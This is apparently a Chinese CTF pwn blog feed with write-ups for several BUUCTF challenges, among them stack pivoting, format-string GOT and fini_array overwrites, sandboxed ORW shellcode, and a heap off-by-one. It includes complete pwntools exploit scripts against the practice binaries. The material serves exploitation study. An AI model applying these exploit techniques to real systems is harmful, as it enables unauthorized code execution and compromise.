<h2 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h2><p>​	首先我们要想办法绕过<code>if</code>语句，第一个很容易看出，我们写进<code>s1</code>的数据前<code>5</code>个字符必须为<code>admin</code>。但是我们点进第二个函数中，其实我是看不懂这些函数的，然后看别的师傅的<code>wp</code>发现是一个<code>md5</code>加密，也是要我们写到<code>buf</code>中的内容的前<code>5</code>个字符为<code>admin</code>。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053468.png" alt="image-20240328173330991" style="zoom: 80%;" />

<p>​	然后我们开始往<code>.bss</code>段中写<code>rop</code>链，我们让第一个内存单元存储<code>admin</code>，以绕过<code>if</code>语句。然后这里又有一个问题，就是我们<code>read</code>只能读入<code>0x20(32)</code>个字节，而<code>b&#39;admin\x00\x00\x00&#39;+p64(pop_rdi)+p64(puts_got)</code>已经用了<code>24</code>个字节，也就是说我们写入<code>elf.plt[&#39;puts&#39;]</code>后便不能再写返回地址了，显然这是不行的。所以这里我们直接劫持程序执行流到<code>call puts</code>指令的地址，这样也达到了我们再次进行两次<code>read</code>的目的。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101058257.png" alt="image-20240710105823187"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">call_puts_addr = <span class="number">0x4018b5</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x401ab3</span></span><br><span class="line">bss_addr = <span class="number">0x602400</span></span><br><span class="line">payload = <span class="string">b&#x27;admin\x00\x00\x00&#x27;</span>+p64(pop_rdi)+p64(puts_got)+p64(call_puts_addr)</span><br></pre></td></tr></table></figure>

<p>然后栈迁移</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;admin\x00\x00\x00&#x27;</span>*<span class="number">4</span>+p64(bss_addr)</span><br></pre></td></tr></table></figure>

<p>第二次布置<code>one_gadget</code>到<code>.bss</code>段，并进行栈迁移</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;admin\x00\x00\x00&#x27;</span>*<span class="number">3</span>+p64(one_gadget)</span><br><span class="line">p.send(payload)</span><br><span class="line">payload = <span class="string">b&#x27;admin\x00\x00\x00&#x27;</span>*<span class="number">4</span>+p64(bss_addr+<span class="number">0x18</span>)</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>

<h2 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a><code>exp</code></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p,elf,libc = load(<span class="string">&quot;login&quot;</span>,<span class="string">&quot;node5.buuoj.cn:29508&quot;</span>,<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./login&#x27;)</span></span><br><span class="line"><span class="comment"># p = remote(&quot;node5.buuoj.cn&quot;,28732)</span></span><br><span class="line">debug(p,<span class="number">0x4018b5</span>)</span><br><span class="line"><span class="comment"># elf = ELF(&#x27;./login&#x27;)</span></span><br><span class="line"><span class="comment"># # libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line">call_puts_addr = <span class="number">0x4018b5</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x401ab3</span></span><br><span class="line">bss_addr = <span class="number">0x602400</span></span><br><span class="line">payload = <span class="string">b&#x27;admin\x00\x00\x00&#x27;</span>+p64(pop_rdi)+p64(puts_got)+p64(call_puts_addr)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">payload = <span class="string">b&#x27;admin\x00\x00\x00&#x27;</span>*<span class="number">4</span>+p64(bss_addr)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;BaileGeBai&#x27;</span>)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&quot;puts_addr&quot;</span>)</span><br><span class="line">libc_base = puts_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">one_gadget = <span class="number">0x4527a</span>+libc_base <span class="comment">#0xebcf1</span></span><br><span class="line">payload = <span class="string">b&#x27;admin\x00\x00\x00&#x27;</span>*<span class="number">3</span>+p64(one_gadget)</span><br><span class="line">p.send(payload)</span><br><span class="line">payload = <span class="string">b&#x27;admin\x00\x00\x00&#x27;</span>*<span class="number">4</span>+p64(bss_addr+<span class="number">0x18</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101057676.png" alt="image-20240710105754596" style="zoom:67%;" />

<p>​	最后说一下，一开始打本地一直不通并在第二次读入前程序就崩了，而打远程却通了。其实是<code>libc</code>的原因，远程的<code>libc</code>与本地的<code>libc</code>不同，一些栈帧大小也不同，所以我们把本地的<code>libc</code>换成远程的即可。</p>
<h1 id="bbctf-2020-fmt-me"><a href="#bbctf-2020-fmt-me" class="headerlink" title="bbctf_2020_fmt_me"></a><code>bbctf_2020_fmt_me</code></h1><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><ol>
<li><p>在<code>gdb</code>中又学到一个查看地址中内容的命令，<code>x/s</code>以字符串的形式表示。</p>
</li>
<li><p>如果我们要修改<code>8</code>个字节，但是只写入<code>3</code>个或更少的字节，可以直接用<code>fmtstr_payload</code>函数，<code>fmtstr_payload</code>中的参数</p>
</li>
<li><p>命令分隔符<code>;</code></p>
</li>
</ol>
<h2 id="保护-1"><a href="#保护-1" class="headerlink" title="保护"></a>保护</h2><p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053413.png" alt="image-20240405174940311"></p>
<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053521.png" alt="image-20240405175211563" style="zoom:67%;" />

<h2 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a><code>exp</code></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./fmt&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;node5.buuoj.cn&quot;,27604)</span></span><br><span class="line">debug(p,<span class="number">0x4012d5</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./fmt&#x27;</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&quot;atoi_got&quot;</span>)</span><br><span class="line">log_addr(<span class="string">&quot;system_plt&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>, &#123;elf.got[<span class="string">&#x27;system&#x27;</span>]:elf.sym[<span class="string">&#x27;main&#x27;</span>]&#125;,write_size=<span class="string">&#x27;long&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh;&#x27;</span></span><br><span class="line">payload+= fmtstr_payload(<span class="number">7</span>,&#123;elf.got[<span class="string">&#x27;snprintf&#x27;</span>]:<span class="number">0x401056</span>&#125;,<span class="number">8</span>,write_size=<span class="string">&#x27;long&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn刷题记录</category>
        <category>BUU刷题</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>格式化字符串漏洞</tag>
        <tag>栈迁移</tag>
      </tags>
  </entry>
  <entry>
    <title>极客大挑战 2019 Not Bad</title>
    <url>/2023/11/11/BUU%E5%88%B7%E9%A2%98/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DNot%20Bad/</url>
    <content><![CDATA[<p>buu刷题记录，持续更新中……</p>
<span id="more"></span>

<h1 id="极客大挑战-2019-Not-Bad"><a href="#极客大挑战-2019-Not-Bad" class="headerlink" title="[极客大挑战 2019]Not Bad"></a>[极客大挑战 2019]<em>Not Bad</em></h1><h2 id="保护-源码"><a href="#保护-源码" class="headerlink" title="保护&amp;源码"></a>保护&amp;源码</h2><p>保护：</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102302862.png" alt="image-20240302141924012"></p>
<p>源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  mmap((<span class="type">void</span> *)<span class="number">0x123000</span>, <span class="number">0x1000u</span>LL, <span class="number">6</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  sub_400949();</span><br><span class="line">  sub_400906();</span><br><span class="line">  sub_400A16();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sub_400A16</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Easy shellcode, have fun!&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x38u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Baddd! Focu5 me! Baddd! Baddd!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>​	没有开<code>NX</code>保护，大概率要用<code>shellcode</code>，但是本题开了沙箱，我们只能以<code>open,read,write</code>这样的方式获取<code>flag</code>了。有栈溢出，只能溢出<code>0x10</code>个字节，而<code>buf</code>本身也只有<code>0x20</code>个字节，二者都达不到我们写的<code>shellcode</code>的长度，我们只能想其他办法。</p>
<p>​	<code>mmap()</code>函数用于将一个文件或者设备映射到内存中，从而允许对其进行直接的读写操作。本题中<code>mmap</code>为我们分配了一块可读可写的内存，起始地址为<code>0x123000</code>长度为<code>0x1000</code>一个内存页。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//函数原型</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">mmap</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> length, <span class="type">int</span> prot, <span class="type">int</span> flags, <span class="type">int</span> fd, <span class="type">off_t</span> offset)</span>;</span><br></pre></td></tr></table></figure>

<p>​	也就是说我们可以把<code>shellcode</code>布置到<code>mmap</code>为我们分配的地址上，然后再调用<code>shellcode</code>所在的地址即<code>0x123000</code>即可。这一步的<code>payload</code>如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mmap = <span class="number">0x123000</span></span><br><span class="line">call_0x123000 = asm(<span class="string">&#x27;&#x27;&#x27;mov rax,0x123000;call rax&#x27;&#x27;&#x27;</span>)</span><br><span class="line">payload = asm(shellcraft.read(<span class="number">0</span>,mmap,<span class="number">0x100</span>))+call_0x123000</span><br></pre></td></tr></table></figure>

<p>​	我来解释一下上面的内容：<code>shellcraft.read(0,mmap,0x100)</code>的意思是从标准输入中读入数据写到<code>mmap</code>为我们分配的地址上，然后用<code>mov rax,0x123000;call rax</code>这两个指令，调用即可。</p>
<p>​	但是我们只能溢出<code>16</code>个字节，上面这些肯定超出了<code>16</code>个字节，所以我们可以把这些布置到<code>buf</code>中，然后再栈迁移到<code>buf</code>的起始地址即可，完整的<code>payload</code>如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mmap = <span class="number">0x123000</span></span><br><span class="line">jmp_rsp = <span class="number">0x400A01</span></span><br><span class="line">sub_rsp_jmp = asm(<span class="string">&#x27;&#x27;&#x27;sub rsp,0x30;jmp rsp&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#buf+ebp+返回地址(jmp rsp) 一共0x30个字节,也就是控制程序执行流到buf的起始地址开始执行</span></span><br><span class="line">call_0x123000 = asm(<span class="string">&#x27;&#x27;&#x27;mov rax,0x123000;call rax&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#0x123000这个地址放的有shellcode，这里的意思就是执行shellcode</span></span><br><span class="line"></span><br><span class="line">payload = (asm(shellcraft.read(<span class="number">0</span>,mmap,<span class="number">0x100</span>))+call_0x123000).ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(jmp_rsp)+sub_rsp_jmp</span><br></pre></td></tr></table></figure>

<p>​	然后我们利用<code>shellcraft</code>生成<code>open,read,write</code>的<code>shellcode</code>。<code>shellcraft</code>是<code>pwntools</code>库的一部分，是一个用于生成各种<code>shellcode</code>的模块。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#open(&#x27;./flag&#x27;)  打开根目录下的flag文件</span></span><br><span class="line"><span class="comment">#read(3,addr,0x50)  3是上面打开的新文件的文件描述符</span></span><br><span class="line"><span class="comment">#write(1,addr,0x50)</span></span><br><span class="line"></span><br><span class="line">mmap = <span class="number">0x123000</span></span><br><span class="line">orw_shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)        </span><br><span class="line">orw_shellcode += shellcraft.read(<span class="number">3</span>,mmap,<span class="number">0x50</span>)      <span class="comment">#这里我们把读出来的内容放到mmap分配给我们的内存地址上</span></span><br><span class="line">orw_shellcode += shellcraft.write(<span class="number">1</span>,mmap,<span class="number">0x50</span>)     </span><br></pre></td></tr></table></figure>

<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./bad&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28453</span>)</span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">mmap = <span class="number">0x123000</span></span><br><span class="line">jmp_rsp = <span class="number">0x400A01</span></span><br><span class="line">sub_rsp_jmp = asm(<span class="string">&#x27;&#x27;&#x27;sub rsp,0x30;jmp rsp&#x27;&#x27;&#x27;</span>)</span><br><span class="line">call_0x123000 = asm(<span class="string">&#x27;&#x27;&#x27;mov rax,0x123000;call rax&#x27;&#x27;&#x27;</span>)</span><br><span class="line">payload = (asm(shellcraft.read(<span class="number">0</span>,mmap,<span class="number">0x100</span>))+call_0x123000).ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(jmp_rsp)+sub_rsp_jmp</span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">orw_shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)        </span><br><span class="line">orw_shellcode += shellcraft.read(<span class="number">3</span>,mmap,<span class="number">0x50</span>)     </span><br><span class="line">orw_shellcode += shellcraft.write(<span class="number">1</span>,mmap,<span class="number">0x50</span>) </span><br><span class="line">shellcode = asm(orw_shellcode)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102303820.png" alt="image-20240302212556600"></p>
]]></content>
      <categories>
        <category>pwn刷题记录</category>
        <category>BUU刷题</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>ciscn_2019_sw_1</title>
    <url>/2024/03/01/BUU%E5%88%B7%E9%A2%98/ciscn_2019_sw_1/</url>
    <content><![CDATA[<h1 id="ciscn-2019-sw-1"><a href="#ciscn-2019-sw-1" class="headerlink" title="ciscn_2019_sw_1"></a><em>ciscn_2019_sw_1</em></h1><h2 id="学习与收获"><a href="#学习与收获" class="headerlink" title="学习与收获"></a>学习与收获</h2><ol>
<li><p>对于<code>RELRO</code>保护，有以下<code>3</code>种情况：</p>
<span id="more"></span>

<p><code>No RELRO</code>：<code>init.array</code>，<code>fini.array</code>，<code>got.plt</code>均可读可写</p>
<p><code>PARTIAL RELRO</code>：<code>init.array</code>，<code>fini.array</code>可读不可写，<code>got.plt</code>可读可写</p>
<p><code>FULL RELRO</code>：<code>init.array</code>，<code>fini.array</code>，<code>got.plt</code>均可读不可写</p>
</li>
<li><p>程序在加载的时候，会依次调用<code>init_arry</code>中的每一个函数指针，程序在结束的时候，会依次调用<code>fini_array</code>中的每一个函数指针，而我们可以修改其中的函数指针为<code>main</code>函数地址，使<code>main</code>函数再执行一次。一般来说，这个数组的长度为<code>1</code>，也就是说只能写一个地址。</p>
</li>
<li><p>有时候思路对了一直打不通，可能是参数偏移量算错了。</p>
</li>
</ol>
<h2 id="保护-源码"><a href="#保护-源码" class="headerlink" title="保护&amp;源码"></a>保护&amp;源码</h2><p>保护：</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102308582.png" alt="image-20240305180931509"></p>
<p>源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> format[<span class="number">68</span>]; <span class="comment">// [esp+0h] [ebp-48h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to my ctf! What&#x27;s your name?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%64s&quot;</span>, format);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(format);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sys</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(command);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>​	程序中有一个格式化字符串漏洞，但只能执行一次格式化漏洞函数，有<code>system</code>函数。我们可以看到<code>printf(format)</code>后面<code>main</code>函数就执行完了，所以不管我们修改哪一个函数的<code>got</code>表值为<code>system@plt</code>的地址，都不行。后来看<code>wp</code>，发现我们可以修改<code>fini_array</code>的函数指针为<code>main</code>函数地址，这样就能再执行一次<code>main</code>函数了。</p>
<p>​	刚开始用下面这个方法，泄漏我们输入的第一个参数在栈中的偏移量，以为是<code>4</code>，一直打不通，调试的时候查看栈中的值，发现栈中的第<code>1,2</code>和<code>5</code>个参数都是我们输入的第一个参数，所以我们并不能确定准确的偏移量</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102309640.png" alt="image-20240305185357092"></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102309060.png" alt="image-20240305185647495"></p>
<p>​	然后我发送下面这个<code>payload</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;aaaabbbb&#x27;</span>+<span class="string">b&#x27;%p%p%p%p%p&#x27;</span></span><br></pre></td></tr></table></figure>

<p>​	现在可以看出泄漏的第<code>1</code>个参数地址是栈中的第<code>2</code>个参数，也就是说我们计算偏移量的时候要从<code>02</code>这个序号开始往下数</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102310043.png" alt="image-20240305185704092"></p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a><code>exp</code></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./sw1&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26399</span>)</span><br><span class="line"><span class="comment">#debug(p,0x80485A8)</span></span><br><span class="line"><span class="comment">#context.arch=&#x27;i386&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./sw1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x08048534</span></span><br><span class="line">fini_array_addr = <span class="number">0x0804979C</span></span><br><span class="line">printf_got = <span class="number">0x0804989c</span></span><br><span class="line">sys_plt = <span class="number">0x080483d0</span></span><br><span class="line"></span><br><span class="line">payload = p32(printf_got+<span class="number">2</span>)+p32(printf_got)+p32(fini_array_addr)</span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="number">0x804</span>-<span class="number">12</span>),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%4$hn&#x27;</span></span><br><span class="line"><span class="comment">#这里还要减去12，因为前面发送的3个地址一共12个字节</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="number">0x83d0</span>-<span class="number">0x804</span>),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%5$hn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="number">0x8534</span>-<span class="number">0x83d0</span>),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%6$hn&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;name?&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102310684.png" alt="image-20240305190402927"></p>
]]></content>
      <categories>
        <category>pwn刷题记录</category>
        <category>BUU刷题</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>格式化字符串漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>hitcontraining_heapcreator</title>
    <url>/2024/07/11/BUU%E5%88%B7%E9%A2%98/hitcontraining_heapcreator/</url>
    <content><![CDATA[<h2 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h2><p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102332737.png" alt="image-20240710233212702"></p>
<span id="more"></span>

<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>​	一共有<em>create_heap</em>，<em>edit_heap</em>，<em>show_heap</em>，<em>delete_heap</em>四个函数，<em>edit_heap</em>函数中有一个堆溢出漏洞，只可以溢出<code>1</code>个字节。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101814056.png" alt="image-20240710181416024" style="zoom: 80%;" />

<p>​	本题中，每<em>malloc</em>一次会创建一个指针<em>chunk</em>和一个内容<em>chunk</em>（其实就是两个地址空间，分别存储着指向<em>chunk</em>中数据的指针，和<em>chunk</em>的数据），而<em>free</em>一次也就是把这两个地址空间都释放掉了。<em>show_heap</em>和<em>edit_heap</em>函数中打印和修改的内容都是由指针决定的，指针指向什么就打印和修改什么。</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><h3 id="改写-size"><a href="#改写-size" class="headerlink" title="改写_size_"></a>改写_size_</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free_got = elf.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;\x41&#x27;</span></span><br><span class="line"><span class="comment">#往_chunk0_中写入&#x27;/bin/sh\x00&#x27;，后面free(chunk0)的时候其实就是system(&quot;/bin/sh&quot;)</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br></pre></td></tr></table></figure>

<p>​	先创建两个<em>chun</em>，<code>0x18</code>是为了在往<em>chunk0</em>中写内容时，直接覆盖掉<em>chunk1</em>的指针<em>chunk</em>的前<code>8</code>个字节，然后就可以利用溢出的一个字节改写<em>chunk1</em>的指针<em>chunk</em>的<em>size</em>。</p>
<p>如图，指针<em>chunk</em>的<em>size</em>值已经被改写成<code>0x41</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101923019.png" alt="image-20240710192301972"></p>
<p>​	此时，<em>chunk1</em>的指针<em>chunk</em>与内容<em>chunk</em>，已经部分重叠（因为是指针<em>chunk</em>的<em>size</em>被改写成<code>0x41</code>，内容<em>chunk</em>的<em>size</em>还是<code>0x21</code>，所以如图</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102116011.png" alt="image-20240710192301977" style="zoom:80%;" />

<h3 id="泄漏-free-addr"><a href="#泄漏-free-addr" class="headerlink" title="泄漏_free_addr_"></a>泄漏_free_addr_</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x30</span>)+p64(free_got)</span><br><span class="line"><span class="comment">#指针前面0x30是能存储数据的大小，不能改变</span></span><br><span class="line">add(<span class="number">0x30</span>,payload)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content : &quot;</span>)</span><br><span class="line">free_addr = u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&quot;free_addr&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><code>delete(1)</code>后我们可以看到<em>fastbins</em>有两个不同大小的<em>fastbin_chunk</em>，如图</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102122798.png" alt="image-20240710212229702"></p>
<p>​	然后我们再申请<code>0x30</code>的<em>chunk</em>用来存储数据（还有<code>0x10</code>的空间存储<em>prve_size</em>和<em>size</em>），又因为<em>fastbins</em>中正好有<code>0x40</code>的<em>fastbins_chunk</em>，所以<code>0x12c2040</code>及下面<code>0x40</code>的内存空间就成了新<em>chunk</em>的内存<em>chunk</em>，<code>0x12c2060</code>及下面<code>0x20</code>的内存空间就成了新<em>chunk</em>的指针内存。</p>
<p>​	然后我们把<em>free@got</em>写到内存<em>chunk</em>的<code>0x12c2078</code>地址里，这个地址存储着指针<em>chunk</em>里的指针，所以现在指针就是<em>free@got</em>，而<em>show</em>函数打印出来的数据是该指针指向的内容，也就是<em>free@got</em>指向的内容。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102155262.png" alt="image-20240710215550221"></p>
